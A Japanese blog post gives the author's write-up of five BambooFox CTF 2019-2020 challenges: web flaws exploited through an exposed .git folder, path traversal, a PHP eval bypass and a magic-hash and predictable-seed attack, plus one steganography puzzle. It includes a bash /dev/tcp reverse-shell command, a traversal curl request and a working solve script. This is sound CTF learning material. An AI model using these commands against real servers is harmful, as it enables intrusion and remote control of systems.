---
layout: post
title: BambooFox CTF の write-up
categories: [ctf]
date: 2020-01-04 06:20:00 +0900
---

昨年の 12 月 31 日から今年の 1 月 1 日にかけて、[これまた](2020-01-04-contrail-ctf.html)なんと年をまたいで開催された [BambooFox CTF](https://ctf.bamboofox.cs.nctu.edu.tw/) に、チーム zer0pts として参加しました。最終的にチームで 3751 点を獲得し、順位は得点 554 チーム中 5 位でした。うち、私は 5 問を解いて 930 点を入れました。

他のメンバーの write-up はこちら。

- [BambooFox CTF 2019 Oracle writeup - ふるつき](https://furutsuki.hatenablog.com/entry/2020/01/01/221936)
- [BambooFox CTF 2019-2020 Writeup - CTFするぞ](https://ptr-yudai.hatenablog.com/entry/2020/01/01/194543)

以下、私が解いた問題の write-up です。

## [Web 39] Web Newbie (247 solves)
> (URL)
> 
> Hey, I just learned how to make a web application!
> 
> Even though I might create some vulnerabilities, but I bet you'll never get the flag!
> 
> The submitted files will be deleted every hour.

与えられた URL にアクセスすると、以下のような HTML が返ってきました。

```html
︙
<nav class="navbar navbar-expand-lg navbar-dark bg-primary">
  <a class="navbar-brand" href="/">PasteBin</a>
  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#nav" aria-controls="nav" aria-expanded="false">
    <span class="navbar-toggler-icon"></span>
  </button>
  <div id="nav" class="collapse navbar-collapse">
    <ul class="navbar-nav mr-auto">
      <li class="nav-item active">
        <a class="nav-link" href="/myfirstweb/index.php?op=new">New</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="/myfirstweb/index.php?op=nav&link=about">About</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="/myfirstweb/index.php?op=nav&link=warning">Warning</a>
      </li>
      <!--
      <li class="nav-item">
        <a class="nav-link" href="/myfirstweb/index.php?op=nav&link=hint">Hint</a>
      </li>
      -->
    </ul>
  </div>
</nav>
︙
```

コメントアウトされていて怪しい `/myfirstweb/index.php?op=nav&link=hint` にアクセスすると、`Flag is in ../flag.txt` というヒントが表示されました。`/flag.txt` にアクセスするとフラグが得られました。

```
BAMBOOFOX{0hhh_n0_s7up1d_li77l3_8ug}
```

## [Web 172] HAPPY (49 solves)
> I prefer Jekyll for building my blog. Please try to read /home/web/flags/flag1.txt.
> 
> (URL)
> 
> author: djosix

与えられた URL にアクセスすると、静的っぽいブログが表示されました。

試しに `/.git/config` にアクセスしてみると Git の設定ファイルが表示されました。`.git` ディレクトリをそのまま残しておりアクセスできるようなので [kost/dvcs-ripper](https://github.com/kost/dvcs-ripper) の `rip-git.pl` でダウンロードすると、なんとアセンブリで書かれた自作の Web サーバが出てきました。

なんとなく Path Traversal ができるだろうと考えて `curl --path-as-is "http://(省略)/../../../home/web/flags/flag1.txt"` を実行するとフラグが得られました。

```
BAMBOOFOX{251d19bd7cb60e72a3825d898bffcee5}
```

## [Web 294] Warmup (25 solves)
> This challenge is to increase your confidence.
> 
> (URL)
> 
> author: djosix

与えられた URL にアクセスすると、以下のような PHP コードが表示されました。

```php
<?php
    highlight_file(__FILE__);

    if ($x = @$_GET['x'])
        eval(substr($x, 0, 5));
```

GET パラメータとして与えられたユーザ入力を先頭 5 文字だけ実行してくれるようです。ぱっと見厳しそうですが、PHP には[バッククォートで囲んだ文字列を OS コマンドとして実行してくれる便利な機能](https://www.php.net/manual/ja/language.operators.execution.php)があります。ユーザ入力の全体が `$x` という変数に格納されているので、ユーザ入力の先頭 5 文字を以下のようにすれば全体を OS コマンドとして実行できるはずです。

```
`$x`;
```

この後ろに `bash -i >& /dev/tcp/(IP アドレス)/(ポート番号) 0>&1` のような OS コマンドを置いてリバースシェルを張ります。

```
$ nc -lvp 8000
︙
www-data@e20c154c561f:/var/www/html$ ls -la
ls -la
total 16
drwxr-xr-x 2  501 staff 4096 Dec 30 22:26 .
drwxr-xr-x 1 root root  4096 Nov 22 15:47 ..
-rw-r--r-- 1  501 staff   53 Dec 30 17:57 BAMBOOFOX{d22a508c497c1ba84fb3e8aab238a74e}
-rw-r--r-- 1  501 staff   96 Dec 30 17:54 index.php
www-data@e20c154c561f:/var/www/html$ 
```

フラグが得られました。

```
BAMBOOFOX{d22a508c497c1ba84fb3e8aab238a74e}
```

## [Web 303] Messy PHP (24 solves)
> This should be easy. No need to explain, right? (URL)

与えられた URL にアクセスすると、以下のような PHP コードが表示されました。

```php
<?php

# Useless changelog here
include_once('flag.php');
# TODO: Remove the source
# TODO: Remove useless comment
# TODO: Fire some people
# TODO: Remove useless TODO
# TODO: Rewrite the code
# TODO: Replace emoji to normal variable name
# TODO: Eat something
# TODO: Quit the job, maintain this is toooooo hard
show_source(__FILE__);
echo strlen($fllllllag) . "\n";
if ((isset($_POST['😂']) and isset($_POST['🤣']) and isset($_GET['KEY'])) or isset($_GET['is_this_flag？'])){
    srand(20191231 + 20200101 + time());
    $mystr = 'Happy';
    $mystr .= ' New';
    $mystr .= '  Year⁠!~~~';
    # Useless comment here
    $array1 = str_split($fllllllag, 1);
    # 2019-01-01
    # Alice: What is array1, array2, and array3 ????
    # 2019-12-31
    # Alice: Can someone explain to me?
    $array2 = str_split($mystr, 1);
    # Want to kill your colleague for shitty code?
    # Call 000000000 now
    $array3 = str_split($_GET['KEY'], 1);
    $final = '';
    # More useless changelog here
    foreach( $array1 as $value ){
    # 2019-12-31
    # Bob: This should be ok to protect our secret
    # Alice: No
    # Bob: Yes, it is
    # Alice: No!
    # Bob: prove it to me?
    # Ann: don't chat in here, plz
    # Bob: fine
        $final .= @strval(ord($value) ^ rand() ^ $array2[rand() % count($array2)] ^ ($array3[rand() % count($array3)] * random_int(1,128))) . ' ';
    }
    if ($_POST['​😂'] == md5($_POST['🤣​'])){
        # Remove this to gain some money for your job
        sleep(1);
        echo $final;
    }else{
        # Who did this shit?
        die('bye!');
    }

    # Our secret verify machine
    if ($fllllllag === $_GET['is_this_flag？']){
        echo 'Here is your flag haha: ' . $fllllllag;
    }
}else{
    # More random sleep for performance improve
    sleep(random_int(1,2));
    # Decided to quit your job?    
    die('bye!');
}
```

読みにくいですが、

- `srand(20191231 + 20200101 + time());` と、`rand` については乱数シードが推測可能 (`random_int(1,128)` は推測不可能)
- `$final` の各文字については、`rand() ^ $array2[rand() % count($array2)]` は `rand()` の返り値が推測できるのでわかり、`$array3[rand() % count($array3)] * random_int(1,128))` も `$array3` は `str_split($_GET['KEY'], 1)` とユーザ入力由来なので null 文字を入力すれば OK。これで元の文字が推測可能
- `$_POST['​😂'] == md5($_POST['🤣​'])` では PHP の `0 == '0e123'` となる仕様を使って、いわゆる Magic Hash が使える (なお、最初の `isset($_POST['😂'])` と `isset($_POST['🤣'])` ではそれぞれ U+1F602 と U+1F923 のみなのに対して、ここではそれぞれ U+200B が前、U+DD23 が後ろについていることに注意)

という点さえわかれば `$final` の元の文字列が復元できます。

```
$ php -r "echo time();"; echo; curl -X POST "http://(省略)/?KEY=%00" -d "%F0%9F%98%82&%F0%9F%A4%A3&%E2%80%8B%F0%9F%98%82=0&%F0%9F%A4%A3%E2%80%8B=240610708"
1577837477
︙
1686891512 1291944467 293846636 686937786 559546983 1191396174 776294258 492845660 485578303 1747125449 1655430137 55804001 333446820 1700451417 1170936616 267757321 764365832 1298591808 1029433726 446934415 788760354 1360338466 724455005 1214062018 1681176396 1982275396 293585629 2024032342 444621824 1077017345 875226576 669706981 1432605123 2032716097 614675097
```

```
$ cat solve.php
<?php
$t = 1577837477;
$encrypted = [1686891512, 1291944467, 293846636, 686937786, 559546983, 1191396174, 776294258, 492845660, 485578303, 1747125449, 1655430137, 55804001, 333446820, 1700451417, 1170936616, 267757321, 764365832, 1298591808, 1029433726, 446934415, 788760354, 1360338466, 724455005, 1214062018, 1681176396, 1982275396, 293585629, 2024032342, 444621824, 1077017345, 875226576, 669706981, 1432605123, 2032716097, 614675097];
for ($i = $t - 100; $i < $t + 100; $i++) {
  srand(20191231 + 20200101 + $i);
  $res = '';
  foreach ($encrypted as $v) {
    $x = $v ^ rand();
    rand(); rand();
    if ($x < 0x20 or $x > 0x7e) {
      break;
    }
    $res .= chr($x);
  }
  if (strlen($res) > 0) {
    echo $i . "\n";
    var_dump($res);
  }
}
$ php solve.php
1577837477
string(35) "BAMBOOFOX{WHY_THERE_ARE_UNICODE_LA}"
```

フラグが得られました。

```
BAMBOOFOX{WHY_THERE_ARE_UNICODE_LA}
```

## [Misc 122] Find the Cat (73 solves)
> The cat is hiding somewhere. Where is the cat?
> 
> 添付ファイル: cat.png

とりあえず `binwalk` でなにか仕込まれていないか確認します。

```
$ binwalk cat.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 739 x 554, 8-bit/color RGBA, non-interlaced
101           0x65            Zlib compressed data, best compression
371382        0x5AAB6         PNG image, 739 x 554, 8-bit/color RGBA, non-interlaced
371483        0x5AB1B         Zlib compressed data, best compression
```

IEND チャンクの後ろにもうひとつ PNG ファイルがあるようです。…が、抽出してみてもどちらも同じ画像にしか見えません。[青い空を見上げればいつもそこに白い猫](https://digitaltravesia.jp/usamimihurricane/webhelp/_RESOURCE/MenuItem/another/anotherAoZoraSiroNeko.html)を使って人間にはわからない程度の違いが仕込まれてないか調べてみましょう。

![QR コードが出てきた](../images/2020-01-04_diff.png)

QR コードが出てきました。これを 2 値化して読み込むと以下のように URL が出てきました。

```
$ zbarimg diff.png
QR-Code:https://imgur.com/download/Xrv86y2
scanned 1 barcode symbols from 1 images
```

与えられた URL にアクセスすると JPEG ファイルがダウンロードできました…が、データが足りていないようで正しく表示されません。EXIF などでなにか埋め込まれていないか `strings` に投げてみましょう。

```
$ strings Xrv86y2.jpg
…z$6C93L7FuaEBAMBOOFOX{{d3d13151dv65d2d1cvc}BAMBOOFOX{,iu,}}A@vpZS0T$vuAkC9w@IUk^J9zoD8*RIyA*e@C9Hj0*q…
```

フラグっぽい文字列が含まれていますが、形式としては正しくありません。フラグとして正しい文字列 (`BAMBOO{[^}]+}`) を探すとフラグが得られました。

```
BAMBOOFOX{Y0u_f1nd_th3_h1dd3n_c4t!!!}
```